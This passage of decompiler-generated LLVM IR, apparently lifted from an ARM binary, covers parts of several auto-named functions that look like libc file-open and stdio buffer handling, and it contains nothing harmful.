  store i32 %v1_14918, i32* %r3.global-to-local, align 4
  %v2_1491c = or i32 %v1_14918, %v0_1491c
  store i32 %v2_1491c, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_14924:                               ; preds = %dec_label_pc_148cc
  %v7_14924 = icmp eq i32 %v0_14924, -1
  %v0_14930.pre = load i32, i32* @r4, align 4
  br i1 %v7_14924, label %dec_label_pc_14924._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_14924
  %v2_14928 = or i32 %v0_14930.pre, ptrtoint (i32* @global_var_20000.516 to i32)
  store i32 %v2_14928, i32* @r4, align 4
  br label %dec_label_pc_14924._crit_edge

dec_label_pc_14924._crit_edge:                    ; preds = %dec_label_pc_14924, %bb36
  %v0_14930 = phi i32 [ %v2_14928, %bb36 ], [ %v0_14930.pre, %dec_label_pc_14924 ]
  %v0_1492c = load i32, i32* @r6, align 4
  store i32 %v0_1492c, i32* %r0.global-to-local, align 4
  store i32 %v0_14930, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_14938 = call i32 @function_109e8(i32 %v0_1492c, i32 %v0_14930)
  store i32 %v2_14938, i32* %r0.global-to-local, align 4
  %v1_1493c = icmp slt i32 %v2_14938, 0
  %v1_14940 = load i32, i32* @sb, align 4
  %v2_14940 = add i32 %v1_14940, 4
  %v3_14940 = inttoptr i32 %v2_14940 to i32*
  store i32 %v2_14938, i32* %v3_14940, align 4
  br i1 %v1_1493c, label %dec_label_pc_14860, label %.dec_label_pc_14948_crit_edge

.dec_label_pc_14948_crit_edge:                    ; preds = %dec_label_pc_14924._crit_edge
  %v0_1494c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %.dec_label_pc_14948_crit_edge, %dec_label_pc_14918
  %v0_14964 = phi i32 [ %v0_1494c.pre, %.dec_label_pc_14948_crit_edge ], [ %v2_1491c, %dec_label_pc_14918 ]
  %v0_14948 = load i32, i32* @sb, align 4
  %v1_14948 = inttoptr i32 %v0_14948 to i16*
  %v2_14948 = load i16, i16* %v1_14948, align 2
  %v3_14948 = zext i16 %v2_14948 to i32
  %v1_1494c = urem i32 %v0_14964, 4
  %v1_14950 = and i32 %v0_14964, 1024
  %v1_14954 = and i32 %v3_14948, 8192
  %v1_14958 = add nuw nsw i32 %v1_1494c, 1
  %v2_1495c = or i32 %v1_14954, %v1_14950
  store i32 %v2_1495c, i32* %r3.global-to-local, align 4
  %v1_14960 = xor i32 %v1_14958, 3
  store i32 %v1_14960, i32* %r1.global-to-local, align 4
  %v1_14964 = and i32 %v0_14964, ptrtoint (i32* @global_var_20000.516 to i32)
  store i32 %v1_14964, i32* %r2.global-to-local, align 4
  %v2_14964 = icmp eq i32 %v1_14964, 0
  %v1_14968 = add i32 %v0_14948, 4
  %v2_14968 = inttoptr i32 %v1_14968 to i32*
  %v3_14968 = load i32, i32* %v2_14968, align 4
  store i32 %v3_14968, i32* @r5, align 4
  br i1 %v2_14964, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_14948
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14948, %bb37
  %v0_14974 = phi i32 [ 0, %dec_label_pc_14948 ], [ 32768, %bb37 ]
  %v4_14970 = mul nuw nsw i32 %v1_14960, 16
  %v5_14970 = or i32 %v2_1495c, %v4_14970
  store i32 %v5_14970, i32* %r3.global-to-local, align 4
  %v2_14974 = or i32 %v0_14974, %v5_14970
  store i32 %v2_14974, i32* %r2.global-to-local, align 4
  %v8_14978 = icmp eq i32 %v3_14968, 2147483647
  %v1_1497c = trunc i32 %v2_14974 to i16
  store i16 %v1_1497c, i16* %v1_14948, align 2
  br i1 %v8_14978, label %dec_label_pc_149ac, label %dec_label_pc_14984

dec_label_pc_14984:                               ; preds = %bb38
  %v0_14984 = call i32 @function_11204()
  store i32 %v0_14984, i32* @r4, align 4
  %v0_1498c = load i32, i32* @r5, align 4
  store i32 %v0_1498c, i32* @r0, align 4
  %v1_14990 = inttoptr i32 %v0_14984 to i32*
  %v2_14990 = load i32, i32* %v1_14990, align 4
  store i32 %v2_14990, i32* @r5, align 4
  %v1_14994 = call i32 @function_15b7c(i32 %v0_1498c)
  store i32 %v1_14994, i32* %r0.global-to-local, align 4
  %v2_14998 = icmp eq i32 %v1_14994, 0
  br i1 %v2_14998, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_14984
  %v1_1499c = load i32, i32* @sb, align 4
  %v2_1499c = inttoptr i32 %v1_1499c to i16*
  %v3_1499c = load i16, i16* %v2_1499c, align 2
  %v4_1499c = zext i16 %v3_1499c to i32
  %v2_149a0 = or i32 %v4_1499c, 256
  store i32 %v2_149a0, i32* %r3.global-to-local, align 4
  %v2_149a4 = trunc i32 %v2_149a0 to i16
  store i16 %v2_149a4, i16* %v2_1499c, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14984, %bb39
  %v0_149a8 = load i32, i32* @r5, align 4
  %v1_149a8 = load i32, i32* @r4, align 4
  %v2_149a8 = inttoptr i32 %v1_149a8 to i32*
  store i32 %v0_149a8, i32* %v2_149a8, align 4
  br label %dec_label_pc_149ac

dec_label_pc_149ac:                               ; preds = %bb38, %.thread5
  %v0_149ac = load i32, i32* @sb, align 4
  %v1_149ac = add i32 %v0_149ac, 8
  %v2_149ac = inttoptr i32 %v1_149ac to i32*
  %v3_149ac = load i32, i32* %v2_149ac, align 4
  store i32 %v3_149ac, i32* %r3.global-to-local, align 4
  %v2_149b0 = icmp eq i32 %v3_149ac, 0
  br i1 %v2_149b0, label %dec_label_pc_149b8, label %bb40

dec_label_pc_149b8:                               ; preds = %dec_label_pc_149ac
  store i32 4096, i32* @r0, align 4
  %v0_149bc = call i32 @function_1183c()
  store i32 %v0_149bc, i32* %r0.global-to-local, align 4
  %v2_149c0 = icmp eq i32 %v0_149bc, 0
  %v1_149d0.pre = load i32, i32* @sb, align 4
  br i1 %v2_149c0, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_149b8
  %v2_149c4 = inttoptr i32 %v1_149d0.pre to i16*
  %v3_149c4 = load i16, i16* %v2_149c4, align 2
  %v4_149c4 = zext i16 %v3_149c4 to i32
  %v2_149c8 = add i32 %v0_149bc, 4096
  store i32 %v2_149c8, i32* %r2.global-to-local, align 4
  %v2_149cc = or i32 %v4_149c4, 16384
  store i32 %v2_149cc, i32* %r3.global-to-local, align 4
  %v2_149d0 = add i32 %v1_149d0.pre, 8
  %v3_149d0 = inttoptr i32 %v2_149d0 to i32*
  store i32 %v0_149bc, i32* %v3_149d0, align 4
  %v1_149d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_149d4 = load i32, i32* @sb, align 4
  %v3_149d4 = add i32 %v2_149d4, 12
  %v4_149d4 = inttoptr i32 %v3_149d4 to i32*
  store i32 %v1_149d4, i32* %v4_149d4, align 4
  %v1_149d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_149d8 = trunc i32 %v1_149d8 to i16
  %v3_149d8 = load i32, i32* @sb, align 4
  %v4_149d8 = inttoptr i32 %v3_149d8 to i16*
  store i16 %v2_149d8, i16* %v4_149d8, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_149b8
  %v2_149d019 = add i32 %v1_149d0.pre, 8
  %v3_149d020 = inttoptr i32 %v2_149d019 to i32*
  store i32 0, i32* %v3_149d020, align 4
  %v2_149dc = load i32, i32* @sb, align 4
  %v3_149dc = add i32 %v2_149dc, 12
  %v4_149dc = inttoptr i32 %v3_149dc to i32*
  store i32 0, i32* %v4_149dc, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_149ac, %.thread9
  store i32 56, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_149e8 = load i32, i32* @fp, align 4
  %v2_149e8 = add i32 %v0_149e8, 56
  %v3_149e8 = inttoptr i32 %v2_149e8 to i32*
  %v4_149e8 = load i32, i32* %v3_149e8, align 4
  store i32 %v4_149e8, i32* %r3.global-to-local, align 4
  %v2_149ec = load i32, i32* @sb, align 4
  %v3_149ec = add i32 %v2_149ec, 2
  %v4_149ec = inttoptr i32 %v3_149ec to i8*
  store i8 0, i8* %v4_149ec, align 1
  %v0_149f0 = load i32, i32* @sb, align 4
  %v1_149f0 = inttoptr i32 %v0_149f0 to i16*
  %v2_149f0 = load i16, i16* %v1_149f0, align 2
  %v3_149f0 = zext i16 %v2_149f0 to i32
  store i32 %v3_149f0, i32* %r2.global-to-local, align 4
  %v0_149f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149f4 = inttoptr i32 %v0_149f4 to i32*
  %v2_149f4 = load i32, i32* %v1_149f4, align 4
  store i32 %v2_149f4, i32* %r1.global-to-local, align 4
  %v1_149f8 = add i32 %v0_149f0, 8
  %v2_149f8 = inttoptr i32 %v1_149f8 to i32*
  %v3_149f8 = load i32, i32* %v2_149f8, align 4
  store i32 %v3_149f8, i32* %r3.global-to-local, align 4
  %v1_149fc = and i32 %v3_149f0, 8192
  %v2_149fc = icmp eq i32 %v1_149fc, 0
  %v2_14a00 = add i32 %v0_149f0, 20
  %v3_14a00 = inttoptr i32 %v2_14a00 to i32*
  store i32 %v3_149f8, i32* %v3_14a00, align 4
  %v0_14a04 = load i32, i32* %r0.global-to-local, align 4
  %v1_14a04 = load i32, i32* @sb, align 4
  %v2_14a04 = add i32 %v1_14a04, 44
  %v3_14a04 = inttoptr i32 %v2_14a04 to i32*
  store i32 %v0_14a04, i32* %v3_14a04, align 4
  %v0_14a08 = load i32, i32* %r1.global-to-local, align 4
  %v1_14a08 = load i32, i32* @sb, align 4
  %v2_14a08 = add i32 %v1_14a08, 52
  %v3_14a08 = inttoptr i32 %v2_14a08 to i32*
  store i32 %v0_14a08, i32* %v3_14a08, align 4
  %v0_14a0c = load i32, i32* %r3.global-to-local, align 4
  %v1_14a0c = load i32, i32* @sb, align 4
  %v2_14a0c = add i32 %v1_14a0c, 24
  %v3_14a0c = inttoptr i32 %v2_14a0c to i32*
  store i32 %v0_14a0c, i32* %v3_14a0c, align 4
  %v0_14a10 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a10 = load i32, i32* @sb, align 4
  %v2_14a10 = add i32 %v1_14a10, 28
  %v3_14a10 = inttoptr i32 %v2_14a10 to i32*
  store i32 %v0_14a10, i32* %v3_14a10, align 4
  %v0_14a14 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a14 = load i32, i32* @sb, align 4
  %v2_14a14 = add i32 %v1_14a14, 16
  %v3_14a14 = inttoptr i32 %v2_14a14 to i32*
  store i32 %v0_14a14, i32* %v3_14a14, align 4
  br i1 %v2_149fc, label %dec_label_pc_14ad0, label %dec_label_pc_14a1c

dec_label_pc_14a1c:                               ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_14a20 = load i32, i32* @fp, align 4
  %v2_14a20 = add i32 %v0_14a20, 36
  %v3_14a20 = inttoptr i32 %v2_14a20 to i32*
  %v4_14a20 = load i32, i32* %v3_14a20, align 4
  store i32 %v4_14a20, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_14a28 = add i32 %v0_14a20, 108
  %v3_14a28 = inttoptr i32 %v2_14a28 to i32*
  %v4_14a28 = load i32, i32* %v3_14a28, align 4
  store i32 %v4_14a28, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_14a30 = ptrtoint i32* %stack_var_-56 to i32
  %v2_14a34 = add i32 %v0_14a20, 72
  %v3_14a34 = inttoptr i32 %v2_14a34 to i32*
  %v4_14a34 = load i32, i32* %v3_14a34, align 4
  store i32 %v4_14a20, i32* %r1.global-to-local, align 4
  store i32 %v4_14a28, i32* %r2.global-to-local, align 4
  store i32 %v2_14a30, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a34)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14a50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a50, i32* %r0.global-to-local, align 4
  %v0_14a54 = load i32, i32* @fp, align 4
  %v2_14a54 = add i32 %v0_14a54, 16
  %v3_14a54 = inttoptr i32 %v2_14a54 to i32*
  %v4_14a54 = load i32, i32* %v3_14a54, align 4
  call void @__pseudo_branch(i32 %v4_14a54)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_14a64 = load i32, i32* @fp, align 4
  %v2_14a64 = add i32 %v0_14a64, 96
  %v3_14a64 = inttoptr i32 %v2_14a64 to i32*
  %v4_14a64 = load i32, i32* %v3_14a64, align 4
  store i32 %v4_14a64, i32* %r4.global-to-local, align 4
  %v0_14a68 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14a68, i32* %r1.global-to-local, align 4
  store i32 %v4_14a64, i32* %r2.global-to-local, align 4
  store i32 %v2_14820, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a34)
  store i32 %v4_14a64, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a54)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14a8c = load i32, i32* @fp, align 4
  %v2_14a8c = add i32 %v0_14a8c, 44
  %v3_14a8c = inttoptr i32 %v2_14a8c to i32*
  %v4_14a8c = load i32, i32* %v3_14a8c, align 4
  store i32 %v4_14a8c, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_14a94 = inttoptr i32 %v4_14a8c to i32*
  %v2_14a94 = load i32, i32* %v1_14a94, align 4
  store i32 %v2_14a94, i32* %r2.global-to-local, align 4
  store i32 %v2_14820, i32* %r0.global-to-local, align 4
  %v1_14a9c = load i32, i32* @sb, align 4
  %v2_14a9c = add i32 %v1_14a9c, 32
  %v3_14a9c = inttoptr i32 %v2_14a9c to i32*
  store i32 %v2_14a94, i32* %v3_14a9c, align 4
  %v0_14aa0 = load i32, i32* @fp, align 4
  %v1_14aa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_14aa0 = add i32 %v1_14aa0, %v0_14aa0
  %v3_14aa0 = inttoptr i32 %v2_14aa0 to i32*
  %v4_14aa0 = load i32, i32* %v3_14aa0, align 4
  store i32 %v4_14aa0, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_14aa8 = load i32, i32* @sb, align 4
  %v1_14aa8 = load i32, i32* @ip, align 4
  %v2_14aa8 = inttoptr i32 %v1_14aa8 to i32*
  store i32 %v0_14aa8, i32* %v2_14aa8, align 4
  call void @__pseudo_branch(i32 %v4_14aa0)
  store i32 %v2_14a30, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14aa0)
  br label %dec_label_pc_14ad0

dec_label_pc_14acc:                               ; preds = %dec_label_pc_14860, %dec_label_pc_1484c, %dec_label_pc_1486c
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_14ad0

dec_label_pc_14ad0:                               ; preds = %bb40, %dec_label_pc_148a4, %dec_label_pc_14a1c, %dec_label_pc_14acc
  %v0_14ad0 = load i32, i32* @sb, align 4
  store i32 %v0_14ad0, i32* %r0.global-to-local, align 4
  %v2_14ad8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14ad8, i32* %r4.global-to-local, align 4
  store i32 %v6_1480c, i32* @r5, align 4
  store i32 %v9_1480c, i32* @r6, align 4
  store i32 %v18_1480c, i32* @sb, align 4
  store i32 %v24_1480c, i32* @fp, align 4
  ret i32 %v0_14ad0

; uselistorder directives
  uselistorder i32 %v1_149d0.pre, { 2, 1, 0 }
  uselistorder i32 %v0_14964, { 1, 2, 0 }
  uselistorder i32 %v0_14930, { 1, 0 }
  uselistorder i32 %v1_148f4, { 1, 0 }
  uselistorder i32 %v0_148f4, { 1, 0 }
  uselistorder i32 %v1_148dc, { 1, 0, 2 }
  uselistorder i32 %v1_14894, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 6, 5, 7, 8, 9, 10, 11, 1, 13, 12, 15, 14, 0, 16, 17, 18 }
  uselistorder i32 16384, { 50, 0, 51, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 62, 3, 52, 36, 53, 4, 54, 37, 55, 5, 56, 6, 57, 7, 58, 8, 59, 9, 60, 10, 61, 35, 63, 11, 64, 12, 65, 13, 66, 14, 67, 44, 75, 15, 76, 16, 77, 21, 78, 20, 79, 46, 80, 47, 81, 19, 82, 45, 83, 84, 22, 85, 23, 86, 24, 87, 48, 88, 25, 1, 26, 89, 27, 90, 29, 91, 28, 92, 31, 93, 30, 94, 49, 95, 32, 2, 33, 96, 34, 97 }
  uselistorder i32 4096, { 8, 9, 10, 1, 0, 2, 17, 3, 11, 4, 12, 13, 6, 14, 5, 7, 15, 16 }
  uselistorder i32 32768, { 1, 4, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @function_109e8, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_10c10, { 5, 0, 14, 11, 10, 13, 12, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @function_1183c, { 9, 8, 46, 5, 0, 4, 1, 2, 3, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 7, 6 }
  uselistorder i32 80, { 5, 2, 3, 4, 0, 1, 6 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @function_128a8, { 7, 6, 5, 4, 0, 3, 1, 2, 10, 9, 8 }
  uselistorder i32* @fp, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 101, 89, 90, 91, 92, 93, 95, 94, 96, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 81, 82, 84, 85, 86, 87, 88, 97, 98, 99, 100, 48, 49, 50, 51 }
  uselistorder i32* @sb, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 125, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 115, 116, 118, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 48, 46, 47, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 119, 120, 121, 122, 123, 124, 59, 60, 61, 62 }
  uselistorder label %dec_label_pc_14ad0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14acc, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_149ac, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_14924._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_148cc, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1487c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1484c, { 1, 2, 0 }
}

define i32 @function_14ae4(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14ae4:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_14ae4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14ae4, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_14ae4
  %v1_14aec = load i32, i32* %r2.global-to-local, align 4
  %v2_14aec = load i32, i32* %r3.global-to-local, align 4
  %v3_14aec = and i32 %v2_14aec, %v1_14aec
  %v2_14af0 = trunc i32 %v3_14aec to i16
  %v4_14af0 = inttoptr i32 %v3_14aec to i16*
  store i16 %v2_14af0, i16* %v4_14af0, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_14ae4, %bb
  %v0_14b18 = call i32 @function_11204()
  store i32 %v0_14b18, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_14b24 = inttoptr i32 %v0_14b18 to i32*
  %v2_14b24 = load i32, i32* %v1_14b24, align 4
  store i32 %v2_14b24, i32* @r6, align 4
  %v1_14b28 = call i32 @function_15b7c(i32 0)
  %v2_14b30 = icmp eq i32 %v1_14b28, 0
  store i32 124820, i32* @r4, align 4
  br i1 %v2_14b30, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 304, i32* %r2.global-to-local, align 4
  %v5_14b3c = load i16, i16* inttoptr (i32 125124 to i16*), align 4
  %v7_14b3c = zext i16 %v5_14b3c to i32
  %v2_14b40 = xor i32 %v7_14b3c, 256
  store i32 %v2_14b40, i32* @r3, align 4
  %v2_14b44 = trunc i32 %v2_14b40 to i16
  store i16 %v2_14b44, i16* inttoptr (i32 125124 to i16*), align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_14b4c = call i32 @function_15b7c(i32 1)
  %v2_14b50 = icmp eq i32 %v1_14b4c, 0
  br i1 %v2_14b50, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_14b58 = load i32, i32* @r4, align 4
  %v3_14b58 = add i32 %v1_14b58, 304
  store i32 %v3_14b58, i32* %r2.global-to-local, align 4
  %v2_14b5c = add i32 %v1_14b58, 384
  %v3_14b5c = inttoptr i32 %v2_14b5c to i16*
  %v4_14b5c = load i16, i16* %v3_14b5c, align 2
  %v5_14b5c = zext i16 %v4_14b5c to i32
  %v2_14b60 = xor i32 %v5_14b5c, 256
  store i32 %v2_14b60, i32* %r3.global-to-local, align 4
  %v2_14b64 = trunc i32 %v2_14b60 to i16
  store i16 %v2_14b64, i16* %v3_14b5c, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_14b68 = load i32, i32* @r6, align 4
  %v1_14b68 = load i32, i32* @r5, align 4
  %v2_14b68 = inttoptr i32 %v1_14b68 to i32*
  store i32 %v0_14b68, i32* %v2_14b68, align 4
  ret i32 %v1_14b4c

; uselistorder directives
  uselistorder i32 %v3_14aec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_15b7c, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14b7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b7c:
  store i32 124820, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1676c.531 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14b98 = call i32 @function_11310()
  ret i32 %v0_14b98
}

define i32 @function_14c84(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c84:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c84 = load i32, i32* @r4, align 4
  store i32 %v3_14c84, i32* %stack_var_-8, align 4
  %v1_14c88 = add i32 %arg1, 8
  %v2_14c88 = inttoptr i32 %v1_14c88 to i32*
  %v3_14c88 = load i32, i32* %v2_14c88, align 4
  %v1_14c8c = add i32 %arg1, 16
  %v2_14c8c = inttoptr i32 %v1_14c8c to i32*
  %v3_14c8c = load i32, i32* %v2_14c8c, align 4
  %v9_14c90 = icmp eq i32 %v3_14c8c, %v3_14c88
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_14c90, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_14c84
  store i32 %v3_14c88, i32* %v2_14c8c, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_14c84, %bb
  %v1_14c9c = xor i1 %v9_14c90, true
  call void @__pseudo_cond_branch(i1 %v1_14c9c, i32 ptrtoint (i32* @global_var_15f68.532 to i32))
  %v0_14ca0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ca0 = add i32 %v0_14ca0, 8
  %v2_14ca0 = inttoptr i32 %v1_14ca0 to i32*
  %v3_14ca0 = load i32, i32* %v2_14ca0, align 4
  %v1_14ca4 = add i32 %v0_14ca0, 16
  %v2_14ca4 = inttoptr i32 %v1_14ca4 to i32*
  %v3_14ca4 = load i32, i32* %v2_14ca4, align 4
  %v2_14ca8 = sub i32 %v3_14ca4, %v3_14ca0
  %v2_14cac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14cac, i32* @r4, align 4
  ret i32 %v2_14ca8

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_14cb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_14cb4:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14cb4 = load i32, i32* @r4, align 4
  store i32 %v3_14cb4, i32* %stack_var_-16, align 4
  %v6_14cb4 = load i32, i32* @r5, align 4
  %v12_14cb4 = load i32, i32* @lr, align 4
  %v1_14cb8 = add i32 %arg1, 52
  %v2_14cb8 = inttoptr i32 %v1_14cb8 to i32*
  %v3_14cb8 = load i32, i32* %v2_14cb8, align 4
  %v2_14cc0 = icmp eq i32 %v3_14cb8, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 124820, i32* %r6.global-to-local, align 4
  br i1 %v2_14cc0, label %dec_label_pc_14cf8, label %dec_label_pc_14cd4

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14cb4
  %v1_14cd4 = add i32 %arg1, 16
  %v2_14cd4 = inttoptr i32 %v1_14cd4 to i32*
  %v3_14cd4 = load i32, i32* %v2_14cd4, align 4
  %v1_14cd8 = add i32 %arg1, 24
  %v2_14cd8 = inttoptr i32 %v1_14cd8 to i32*
  %v3_14cd8 = load i32, i32* %v2_14cd8, align 4
  %v3_14cdc = icmp ult i32 %v3_14cd4, %v3_14cd8
  br i1 %v3_14cdc, label %.thread, label %dec_label_pc_14cec

.thread:                                          ; preds = %dec_label_pc_14cd4
  %v2_14ce0 = inttoptr i32 %v3_14cd4 to i8*
  %v3_14ce0 = load i8, i8* %v2_14ce0, align 1
  %v4_14ce0 = zext i8 %v3_14ce0 to i32
  store i32 %v4_14ce0, i32* %r4.global-to-local, align 4
  %v6_14ce0 = add i32 %v3_14cd4, 1
  store i32 %v6_14ce0, i32* %v2_14cd4, align 4
  br label %dec_label_pc_14d6c

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14cd4
  %v1_14cec = inttoptr i32 %arg1 to i16*
  %v2_14cec = call i32 @function_151e0(i16* %v1_14cec)
  store i32 %v2_14cec, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d6c

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cb4
  %v1_14cfc = add i32 %arg1, 56
  store i32 %v1_14cfc, i32* @r4, align 4
  %v4_14d10 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14d10)
  %v0_14d24 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d24 = add i32 %v0_14d24, 16
  %v3_14d24 = inttoptr i32 %v2_14d24 to i32*
  %v4_14d24 = load i32, i32* %v3_14d24, align 4
  store i32 85296, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14d24)
  %v0_14d30 = load i32, i32* @r5, align 4
  %v1_14d30 = add i32 %v0_14d30, 16
  %v2_14d30 = inttoptr i32 %v1_14d30 to i32*
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  %v1_14d34 = add i32 %v0_14d30, 24
  %v2_14d34 = inttoptr i32 %v1_14d34 to i32*
  %v3_14d34 = load i32, i32* %v2_14d34, align 4
  %v3_14d38 = icmp ult i32 %v3_14d30, %v3_14d34
  br i1 %v3_14d38, label %.thread2, label %dec_label_pc_14d48

.thread2:                                         ; preds = %dec_label_pc_14cf8
  %v2_14d3c = inttoptr i32 %v3_14d30 to i8*
  %v3_14d3c = load i8, i8* %v2_14d3c, align 1
  %v4_14d3c = zext i8 %v3_14d3c to i32
  store i32 %v4_14d3c, i32* %r4.global-to-local, align 4
  %v6_14d3c = add i32 %v3_14d30, 1
  store i32 %v6_14d3c, i32* %v2_14d30, align 4
  br label %dec_label_pc_14d54

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14cf8
  %v1_14d4c = inttoptr i32 %v0_14d30 to i16*
  %v2_14d4c = call i32 @function_151e0(i16* %v1_14d4c)
  store i32 %v2_14d4c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d54

